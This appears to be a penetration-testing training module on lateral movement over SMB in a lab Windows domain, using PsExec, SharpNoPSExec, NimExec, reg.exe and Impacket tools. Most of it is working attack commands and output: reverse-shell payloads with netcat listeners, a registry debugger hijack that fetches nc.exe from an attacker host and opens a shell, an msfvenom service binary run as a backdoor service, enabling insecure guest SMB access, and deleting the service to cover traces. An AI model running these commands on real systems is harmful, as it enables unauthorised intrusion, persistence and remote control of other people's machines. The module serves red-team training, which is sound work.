
<h1>Server Message Block (SMB)</h1>
<p><code>Server Message Block (SMB)</code> is a network communication protocol that facilitates the sharing of files, printers, and other resources among computers within a network. It enables users and applications to read and write files, manage directories, and perform different functions on remote servers as if they were local. It also supports transaction protocols for interprocess communication. <code>SMB</code> primarily operates on Windows systems but is compatible with other operating systems, making it a key protocol for networked environments.</p>
<h2>SMB Rights</h2>
<p>For successful <code>SMB</code> lateral movement, we require an account that is a member of the Administrators group on the target computer. It's also crucial that ports TCP <code>445</code> and TCP <code>139</code> are open. Optionally, port TCP <code>135</code> may also need to be open because some tools use it for communication.</p>
<h4>UAC remote restrictions</h4>
<p><code>UAC</code> might prevent us from achieving remote code execution, but understanding these restrictions is crucial for effectively leveraging these tools while navigating UAC limitations on different versions of Windows, these restrictions imply several key points:</p>
<ul>
<li>Local admin privileges are necessary.</li>
<li>Local admin accounts that are not RID 500 cannot run tools such as <code>PsExec</code> on Windows Vista and later.</li>
<li>Domain users with admin rights on a machine can execute tools such as <code>PsExec</code>.</li>
<li>RID 500 local admin accounts can utilize tools such as <code>PsExec</code> on machines.</li>
</ul>
<h3>SMB Named Pipes</h3>
<p>Named pipes in <code>SMB</code>, accessed via the <code>IPC$</code> share over TCP port 445, are vital for lateral movement within a network. They enable a range of operations from NULL session contexts to those requiring local administrative privileges. For instance, <code>svcctl</code> facilitates the remote creation, starting, and stopping of services to execute commands, as seen in tools like Impacket's <code>psexec.py</code> and <code>smbexec.py</code>. <code>atsvc</code> supports the remote creation of scheduled tasks for command execution, utilized by Impacket's <code>atexec.py</code>. These named pipes are crucial for executing and managing lateral movement operations effectively. <code>winreg</code> provides remote access to the Windows registry, allowing to query and modify registry keys and values, helping in the persistence and configuration of malicious payloads.</p>
<h2>SMB Enumeration</h2>
<p>Before we begin the lateral movement process, we need to ensure that <code>SMB</code> is running on the target host. To achieve this we will use <code>NMAP</code>.</p>
<p>We must conduct a port scan on the target host to verify whether <code>SMB</code> is running on the target. By default, <code>SMB</code> uses ports TCP 139 and TCP 445.</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q nmap 172.20.0.52 -sV -sC -p139,445 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-08 04:07 UTC
Nmap scan report for srv01.internal.cloudapp.net (172.20.0.51)
Host is up (0.0016s latency).

PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: SRV02, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0d:3a:e2:38:3d (Microsoft)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-08T04:07:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.65 seconds
</code></pre>
<h2>Lateral Movement From Windows</h2>
<p>To execute lateral movement from Windows several tools and techniques can be used. In this section, we will be showing <code>PSExec</code>, <code>SharpNoPSExec</code>, <code>NimExec</code>, and <code>Reg.exe</code>. Let's connect via RDP to <code>SRV01</code> using helen's credentials:</p>
<pre><code class="language-shell-session">[!bash!]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
</code></pre>
<h3>PSExec</h3>
<p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> is included in Microsoft's <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals suite</a>, a collection of tools designed to assist administrators in system management tasks. This tool facilitates remote command execution and retrieves output over a named pipe using the <code>SMB</code> protocol, operating on TCP port <code>445</code> and TCP port <code>139</code>.</p>
<p>By default, <code>PSExec</code> performs the following action:</p>
<ol>
<li>Establishes a link to the hidden <code>ADMIN$</code> share, which corresponds to the <code>C:\Windows</code> directory on the remote system, via SMB.</li>
<li>Uses the Service Control Manager (SCM) to initiate the <code>PsExecsvc</code> service and set up a named pipe on the remote system.</li>
<li>Redirects the console’s input and output through the created named pipe for interactive command execution.</li>
</ol>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> <code>PsExec</code> eliminates the double-hop problem because credentials are passed with the command and generates an interactive logon session (Type 2).</p>
</div>
</div>
<p>We can use <code>PsExec</code> to connect to a remote host and execute commands interactivelly. We must specify the computer or target where we are connecting <code>\\SRV02</code>, the option <code>-i</code> for interactive shell, the administrator login credentials with the option <code>-u &lt;user&gt;</code> and the password <code>-p &lt;password&gt;</code>, and <code>cmd</code> to specify the application to execute:</p>
<pre><code class="language-powershell-session">C:\Tools\SysinternalsSuite&gt; .\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd
PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami &amp;&amp; hostname
inlanefreight\helen
SRV02
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> We can execute applications such as <code>cmd</code> or <code>powershell</code> but we can also specify a command to execute. </p>
</div>
</div>
<p>In case we want to execute our payload as <code>NT AUTHORITY\SYSTEM</code>, we need to specify the option <code>-s</code> which means that it will run with <code>SYSTEM</code> privileges:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system
</code></pre>
<h3>SharpNoPSExec</h3>
<p><a href="https://github.com/juliourena/SharpNoPSExec">SharpNoPSExec</a> is a tool designed to facilitate lateral movement by leveraging existing services on a target system without creating new ones or writing to disk, thus minimizing detection risk. The tool queries all services on the target machine, identifying those with a start type set to disabled or manual, current status of stopped, and running with LocalSystem privileges. It randomly selects one of these services and temporarily modifies its binary path to point to a payload of the attacker’s choice. Upon execution, SharpNoPSExec waits approximately 5 seconds before restoring the original service configuration, returning the service to its previous state. This approach not only provides a shell but also avoids the creation of new services, which security monitoring systems could flag.</p>
<p>Executing the tool without parameters we will see some help and usage information.</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\SharpNoPSExec.exe

███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗███████╗ ██████╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝
███████╗███████║███████║██████╔╝██████╔╝██╔██╗ ██║██║   ██║██████╔╝███████╗█████╗   ╚███╔╝ █████╗  ██║
╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██║╚██╗██║██║   ██║██╔═══╝ ╚════██║██╔══╝   ██╔██╗ ██╔══╝  ██║
███████║██║  ██║██║  ██║██║  ██║██║     ██║ ╚████║╚██████╔╝██║     ███████║███████╗██╔╝ ██╗███████╗╚██████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝

Version: 0.0.3
Author: Julio Ureña (PlainText)
Twitter: @juliourena

Usage:
SharpNoPSExec.exe --target=192.168.56.128 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ZQBjAGgAbwAgAEcAbwBkACAAQgBsAGUAcwBzACAAWQBvAHUAIQA="

Required Arguments:
--target=       - IP or machine name to attack.
--payload=      - Payload to execute in the target machine.

Optional Arguments:
--username=     - Username to authenticate to the remote computer.
--password=     - Username's password.
--domain=       - Domain Name, if no set a dot (.) will be used instead.

--service=      - Service to modify to execute the payload, after the payload is completed the service will be restored.
Note: If not service is specified the program will look for a random service to execute.
Note: If the selected service has a non-system account this will be ignored.

--help          - Print help information.
</code></pre>
<p>To perform lateral movement with <code>SharpNoPSExec</code>, we will need a listener as this tool will only allow us to execute code on the machine, but it won't give us an interactive shell as <code>PsExec</code> does. We can start listening with <code>Netcat</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
</code></pre>
<p><code>SharpNoPSExec</code> uses the credentials of the console we are executing the command from, so we need to make sure to launch it from a console that has the correct credentials. Alternatively, we can use the arguments <code>--username</code>, <code>--password</code> and <code>--domain</code>. Additionally, we have to provide the target IP address or the domain name <code>--target=&lt;IP/Domain&gt;</code>, and the command we want to execute. For the command, we can use the payload shown in the help menu to set our reverse shell <code>--payload="c:\windows\system32\cmd.exe /c &lt;reverseShell&gt;</code>. We can generate the reverse shell payload using <a href="https://www.revshells.com/">https://www.revshells.com</a> or our favorite C2:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="

[&gt;] Open SC Manager from 172.20.0.52.

[&gt;] Getting services information from 172.20.0.52.

[&gt;] Looking for a random service to execute our payload.
    |-&gt; Querying service NetTcpPortSharing
    |-&gt; Querying service UevAgentService
    |-&gt; Service UevAgentService authenticated as LocalSystem.

[&gt;] Setting up payload.
    |-&gt; payload = c:\windows\system32\cmd.exe /c ...SNIP...AbwBzAGUAKAApAA==
    |-&gt; ImagePath previous value = C:\Windows\system32\AgentService.exe.
    |-&gt; Modifying ImagePath value with payload.

[&gt;] Starting service User Experience Virtualization Service with new ImagePath.

[&gt;] Waiting 5 seconds to finish.

[&gt;] Restoring service configuration.
    |-&gt; User Experience Virtualization Service Log On =&gt; LocalSystem.
    |-&gt; User Experience Virtualization Service status =&gt; 4.
    |-&gt; User Experience Virtualization Service ImagePath =&gt; C:\Windows\system32\AgentService.exe
</code></pre>
<p>Looking at the attack box, we can see the reverse shell connection successfully being established:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 49866

PS C:\Windows\system32&gt;
</code></pre>
<h3>NimExec</h3>
<p><a href="https://github.com/frkngksl/NimExec">NimExec</a> is a fileless remote command execution tool that operates by exploiting the Service Control Manager Remote Protocol (MS-SCMR). Instead of using traditional <code>WinAPI</code> calls, <code>NimExec</code> manipulates the binary path of a specified or randomly selected service with LocalSystem privileges to execute a given command on the target machine and later restores the original configuration. This is achieved through custom-crafted RPC packets sent over <code>SMB</code> and the <code>svcctl</code> named pipe. Authentication is handled using an <code>NTLM</code> hash, which <code>NimExec</code> utilizes to complete the process via the <code>NTLM</code> Authentication method over its custom packets. By manually crafting the necessary network packets and avoiding OS-specific functions, this tool benefits from Nim's cross-compilation capabilities, making it versatile across different operating systems.</p>
<p>Running the tool without parameters give us some commands and descriptions to let us know how to use it.</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\NimExec.exe

                                                                                             _..._
                                                                                          .-'_..._''.
   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\
 .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'
.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '
|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |
|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |
|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '
|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          .
|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/
|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /
|  |   |  |                                        .'   /    `.   `.                               `
'--'   '--'                                       '----'       '----'

                                            @R0h1rr1m


[!] Missing one or more arguments!
[!] Error unknown or missing parameters!

    -v | --verbose                          Enable more verbose output.
    -u | --username &lt;Username&gt;              Username for NTLM Authentication.*
    -h | --hash &lt;NTLM Hash&gt;                 NTLM password hash for NTLM Authentication.**
    -p | --password &lt;Password&gt;              Plaintext password.**
    -t | --target &lt;Target&gt;                  Lateral movement target.*
    -c | --command &lt;Command&gt;                Command to execute.*
    -d | --domain &lt;Domain&gt;                  Domain name for NTLM Authentication.
    -s | --service &lt;Service Name&gt;           Name of the service instead of a random one.
    --help                                  Show the help message.
</code></pre>
<p><code>Nimexec</code> works simillary to <code>SharpNoPSExec</code>. Let's start our listener using <code>Netcat</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
</code></pre>
<p>To execute <code>NimExec</code>, we must specify the administrator credentials with the options <code>-u &lt;user&gt;</code>, <code>-p &lt;password&gt;</code> and <code>-d &lt;domain&gt;</code>, and the target IP address <code>-t &lt;ip&gt;</code>. Alternatively, we can use the NTLM hash for authentication <code>-h &lt;NT hash&gt;</code> instead of the password. Finally, we must specify the payload to execute with the option <code>-c &lt;cmd.exe&gt; /c &lt;reverseShell&gt;</code>. We can generate the reverse shell payload using <a href="https://revshells.com">revshells.com</a>, and to convert the plain text password to NTLM hash, we can use this <a href="https://gchq.github.io/CyberChef/#recipe=NT_Hash()">recipe</a> in CyberChef.</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; .\NimExec -u helen -d inlanefreight.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v

                                                                                             _..._
                                                                                          .-'_..._''.
   _..._   .--. __  __   ___         __.....__                          __.....__       .' .'      '.\
 .'     '. |__||  |/  `.'   `.   .-''         '.                    .-''         '.    / .'
.   .-.   ..--.|   .-.  .-.   ' /     .-''"'-.  `.                 /     .-''"'-.  `. . '
|  '   '  ||  ||  |  |  |  |  |/     /________\   \ ____     _____/     /________\   \| |
|  |   |  ||  ||  |  |  |  |  ||                  |`.   \  .'    /|                  || |
|  |   |  ||  ||  |  |  |  |  |\    .-------------'  `.  `'    .' \    .-------------'. '
|  |   |  ||  ||  |  |  |  |  | \    '-.____...---.    '.    .'    \    '-.____...---. \ '.          .
|  |   |  ||__||__|  |__|  |__|  `.             .'     .'     `.    `.             .'   '. `._____.-'/
|  |   |  |                        `''-...... -'     .'  .'`.   `.    `''-...... -'       `-.______ /
|  |   |  |                                        .'   /    `.   `.                               `
'--'   '--'                                       '----'       '----'

                                            @R0h1rr1m


[+] Connected to 172.20.0.52:445
[+] NTLM Authentication with Hash is succesfull!
[+] Connected to IPC Share of target!
[+] Opened a handle for svcctl pipe!
[+] Binded to the RPC Interface!
[+] RPC Binding is acknowledged!
[+] SCManager handle is obtained!
[+] Number of obtained services: 208
[+] Selected service is AppMgmt
[+] Service: AppMgmt is opened!
[+] Previous Service Path is: C:\Windows\system32\svchost.exe -k netsvcs -p
[+] Service config is changed!
[!] StartServiceW Return Value: 1053 (ERROR_SERVICE_REQUEST_TIMEOUT)
[+] Service start request is sent!
[+] Service config is restored!
[+] Service handle is closed!
[+] Service Manager handle is closed!
[+] SMB is closed!
[+] Tree is disconnected!
[+] Session logoff!
</code></pre>
<p>Once we execute the tool with the above parameters, we are going successfully establish a reverse shell connection:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 51096

PS C:\Windows\system32&gt;
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> The instructions for compiling <a href="https://github.com/frkngksl/NimExec">NimExec</a> are on GitHub. We will not provide an executable, but we encourage the student to complete the compilation process.</p>
</div>
</div>
<h3>Reg.exe</h3>
<p>Having remote access to the registry with write permissions effectively provides Remote Code Execution (RCE) capabilities. This process utilizes the <code>winreg</code> SMB pipe. Typically, the remote registry service is enabled by default only on server-class operating systems.</p>
<p>We can leverage the program launch handler to move laterally on the network, modifying a registry key to a program frequently used on the target host; we could achieve remote code execution almost immediately.</p>
<p>Before we proceed with <code>reg.exe</code> for lateral movement, we must set up an SMB server to host our payload. We will be using <a href="https://github.com/int0x33/nc.exe/">nc.exe</a> as our payload to get a reverse shell:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre>
<p>In our attack host we execute our <code>Netcat</code> listener:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
</code></pre>
<p>Now, we can execute <code>reg.exe</code> to add a new registry key to Microsoft Edge (<code>msedge.exe</code>). The idea is that once <code>msedge.exe</code> is executed, it will also execute our specified payload. We must specify the full path of the subkey or the entry to be added with the domain name <code>add \\&lt;domain&gt;\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe</code>. <code>/v Debugger</code> specifies the name of the add registry entry and will ensure that our payload gets executed, <code>/t reg_sz</code> specifies the datatype of a Null-terminated string, and finally, we can type our payload <code>/d &lt;payload&gt;</code>:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe &amp;&amp; nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"

The operation completed successfully.
</code></pre>
<p>Once Microsoft Edge is opened by any user in the domain, we will instantly get a reverse shell:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 51096

C:\Program Files (x86)\Microsoft\Edge\Application&gt;
</code></pre>
<p>It is important to keep in mind that to use SMB share folder without authentication we need to have the following registry key set to <code>1</code>:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters
    AllowInsecureGuestAuth    REG_DWORD    0x0
</code></pre>
<p>The above registry key is responsable for allowing guest access in SMB2 and SMB3 which is disable by default on Windows. If have an account with administrative rights, we can use the following command to allow insecure guest authentication:</p>
<pre><code class="language-powershell-session">PS C:\Tools&gt; reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
The operation completed successfully.
</code></pre>
<h2>Lateral Movement From Linux</h2>
<p>To achieve lateral movement from Linux we can use the <a href="https://github.com/fortra/impacket">Impacket</a> tool set. <code>Impacket</code> is a suite of Python libraries designed for interacting with network protocols. It focuses on offering low-level programmatic control over packet manipulation and, for certain protocols like <code>SMB</code> and <code>MSRPC</code>, includes the protocol implementations themselves.</p>
<h3>Psexec.py</h3>
<p><a href="https://github.com/fortra/impacket/blob/master/examples/psexec.py">Psexec.py</a> is a great alternative for Linux users. This method is very similar to the traditional <code>PsExec</code> tool from SysInternals suite. <code>psexec.py</code> creates a remote service by uploading an executable with a random name to the <code>ADMIN$</code> share on the target Windows machine. It then registers this service via RPC and the Windows Service Control Manager. Once registered, the tool establishes communication through a named pipe, allowing for the execution of commands and retrieval of outputs on the remote system. Understanding this mechanism is crucial for effectively utilizing the tool and appreciating its role in facilitating remote command execution.</p>
<p>We can use <code>psexec.py</code> to get remote code execution on a target host, administrator login credentials are required. We must provide the domain, admin level user, password, and the target IP as follows <code>&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 172.20.0.52.....
[*] Found writable share ADMIN$
[*] Uploading file sRhFLBbo.exe
[*] Opening SVCManager on 172.20.0.52.....
[*] Creating service KQWG on 172.20.0.52.....
[*] Starting service KQWG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5830]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;
</code></pre>
<h3>smbexec.py</h3>
<p>The <a href="https://github.com/fortra/impacket/blob/master/examples/smbexec.py">smbexec.py</a> method leverages the built-in Windows SMB functionality to run arbitrary commands on a remote system without uploading files, making it a quieter alternative.</p>
<p>Communication occurs exclusively over TCP port 445. It also sets up a service, using only MSRPC for this, and manages the service through the <code>svcctl</code> SMB pipe.</p>
<p>To use this tool, we must provide the domain name, administrator user, password, and the target IP address <code>&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32&gt;
</code></pre>
<p>As we can see, we now have established a semi-interactive shell on the host.</p>
<h3>services.py</h3>
<p>The <a href="https://github.com/fortra/impacket/blob/master/examples/services.py">services.py</a> script in Impacket interacts with Windows services using the <a href="https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page">MSRPC</a> interface. It allows starting, stopping, deleting, reading status, configuring, listing, creating, and modifying services. During Red Teaming assignments, many tasks can be greatly simplified by gaining access to the target machine's services. This technique is non-interactive, meaning that we won't be able to see the results of the actions in real time.</p>
<p>We can view a list of services in the target host, by typing the command <code>list</code> after providing the domain name, the administrator account, the password, and target IP address <code>&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Listing services available on target
                      1394ohci -                                    1394 OHCI Compliant Host Controller -  STOPPED
                         3ware -                                                                  3ware -  STOPPED
                          ACPI -                                                  Microsoft ACPI Driver -  RUNNING
                       AcpiDev -                                                    ACPI Devices driver -  STOPPED
                        acpiex -                                                Microsoft ACPIEx Driver -  RUNNING
                      acpipagr -                                       ACPI Processor Aggregator Driver -  STOPPED

...SNIP...

          WpnUserService_7a815 -                          Windows Push Notifications User Service_7a815 -  RUNNING
                          KQWG -                                                                   KQWG -  RUNNING
Total Services: 543
</code></pre>
<p>To move laterally with this tool, we can set up a new service, modify an existing one, and define a custom command to get a reverse shell.</p>
<p>To create a new service, instead of using the option <code>list</code> we will use <code>create</code> followed by the name of the new service <code>-name &lt;serviceName&gt;</code>, a display name <code>-display "&lt;Service Display Name&gt;"</code> and finally we specify the command we want to execute with the option <code>-path "cmd /c &lt;payload&gt;"</code>.</p>
<p>For our payload, we will use the Metasploit output option <code>exe-service</code>, which creates a service binary:</p>
<pre><code class="language-shell-session">[!bash!]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload                                     
No encoder specified, outputting raw payload   
Payload size: 460 bytes                        
Final size of exe-service file: 48640 bytes    
Saved as: rshell-9001s.exe
</code></pre>
<p>Now, we can execute the command to create a new service:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating service Service Backdoor
</code></pre>
<p>We can view the configuration of the custom command created using <code>config -name &lt;serviceName&gt;</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying service config for Service Backdoor
TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
START_TYPE        :  2 -  AUTO START
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : \\10.10.14.207\share\rshell-9001.exe
LOAD_ORDER_GROUP  : 
TAG               : 0
DISPLAY_NAME      : Service Backdoor
DEPENDENCIES      : /
SERVICE_START_NAME: LocalSystem
</code></pre>
<p>Before we run the service, we must ensure that the SMB server has the file that will be executed:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo smbserver.py share -smb2support ./
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre>
<p>We must start our <code>Netcat</code> listener:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lnvp 9001
Listening on 0.0.0.0 9001
</code></pre>
<p>We can now start the service with <code>start -name &lt;serviceName&gt;</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor' 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Starting service Service Backdoor
</code></pre>
<p>Looking at our attack host, we have successfully established a reverse shell:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.207] from (UNKNOWN) [10.129.229.244] 62855
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system
</code></pre>
<p>Finally, we can cover up the traces and delete the service by typing <code>delete -name &lt;serviceName&gt;</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Deleting service Service Backdoor
</code></pre>
<p>Alternatively, we use <code>services.py</code> to modify existing services; for example, if we find a service authenticated as a specific user account, we can change the configuration of that service and make it execute our payload. In the following example, we can modify the <code>Spooler</code> service to execute our payload. First, let's see the current service configuration:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name Spooler
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                      
                                               
[*] Querying service config for Spooler
TYPE              : 272 -  SERVICE_WIN32_OWN_PROCESS  SERVICE_INTERACTIVE_PROCESS                                                                                                             
START_TYPE        :  4 -  DISABLED
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : C:\Windows\System32\spoolsv.exe
LOAD_ORDER_GROUP  : SpoolerGroup    
TAG               : 0               
DISPLAY_NAME      : Print Spooler  
DEPENDENCIES      : RPCSS/http/
SERVICE_START_NAME: LocalSystem
</code></pre>
<p>Next we will modify the binary path to our payload and set the <code>START_TYPE</code> to <code>AUTO START</code> with the option <code>-start_type 2</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Changing service config for Spooler
</code></pre>
<p>Finally, we can start the service and wait for our command execution:</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Starting service Spooler
</code></pre>
<p>The advantage of this is that if a service is configured with a specific user account, we can take advantage of that account and impersonate it.</p>
<h3>atexec.py</h3>
<p>The <a href="https://github.com/fortra/impacket/blob/master/examples/atexec.py">atexec.py</a> script utilizes the Windows Task Scheduler service, which is accessible through the <code>atsvc</code> SMB pipe. It enables us to remotely append a task to the scheduler, which will execute at the designated time.</p>
<p>With this tool, the command output is sent to a file, which is subsequently accessed via the <code>ADMIN$</code> share. For this utility to be effective, it's essential to synchronize the clocks on both the attacking and target PCs down to the exact minute.</p>
<p>We can leverage this tool by inserting a reverse shell on the target host.</p>
<p>Let's start a <code>Netcat</code> listener:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
</code></pre>
<p>Now let's pass the domain name, administrator user, password, and target IP address <code>&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</code>, and lastly, we can pass our reverse shell payload to get executed. We can generate the reverse shell payload using <a href="https://www.revshells.com/">revshells.com</a>.</p>
<pre><code class="language-shell-session">[!bash!]$ proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
Impacket v0.11.0 - Copyright 2023 Fortra

